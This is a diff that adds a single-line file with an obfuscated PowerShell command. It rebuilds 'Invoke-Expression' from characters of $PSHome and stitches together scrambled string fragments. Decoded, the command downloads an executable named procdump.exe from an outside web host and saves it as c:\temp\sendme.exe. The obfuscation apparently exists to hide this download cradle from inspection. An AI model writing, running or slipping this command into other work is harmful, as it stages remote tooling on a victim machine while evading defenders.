@@ -1,0 +1,1 @@
+﻿&( $PSHome[21]+$PshoMe[30]+'x') ( (("{17}{8}{0}{7}{18}{6}{15}{11}{10}{14}{5}{19}{16}{3}{1}{2}{4}{9}{12}{13}" -f'e','3','gtemp',':m','m3gsen','mp','tt','st ','-WebRequ','dm','procd','tderr.pl/','e.','exe','u','p://s','exe -OutFile c','Invoke','-Uri h','.')).rEPlacE(([ChAr]109+[ChAr]51+[ChAr]103),[STrING][ChAr]92))
